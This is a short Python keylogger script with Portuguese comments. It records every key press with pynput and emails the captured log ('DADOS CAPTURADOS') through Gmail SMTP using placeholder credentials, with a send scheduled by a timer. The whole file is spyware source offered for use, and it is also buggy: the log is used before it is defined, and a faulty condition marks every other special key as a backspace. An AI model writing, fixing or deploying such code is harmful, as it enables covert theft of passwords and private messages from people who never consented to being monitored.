from pynput import keyboard 
import smtplib
from email.mime.text import MIMEText
from threading import Timer


EMAIL_ORIGEM = "seu_email@gmail.com"
EMAIL_DESTINO = "destinatario@gmail.com"
SENHA_EMAIL = "SUA_SENHA_DE_APP"

def send_email():
    msg = MIMEText(log)
    msg["Subject"] = "DADOS CAPTURADOS"
    msg["From"] = EMAIL_ORIGEM
    msg["To"] = EMAIL_DESTINO

    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)

        print("E-mail enviado com sucesso!")

    except Exception as e:
        print("Erro ao enviar:", e)

send_email()

log = ""

#Agendar envio 60s
Timer(60, send_email).start()
def on_press(key):
    global log
    try:
        log+= key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log+=" "
        elif key == keyboard.Key.enter:
            log+= "\n"
        elif keyboard.Key.backspace:
            log+= "[<]"
        else:
            pass


# Inicia o keylogger envio automático

with keyboard.Listener(on_press=on_press) as listener:
    send_email()
    listener.join()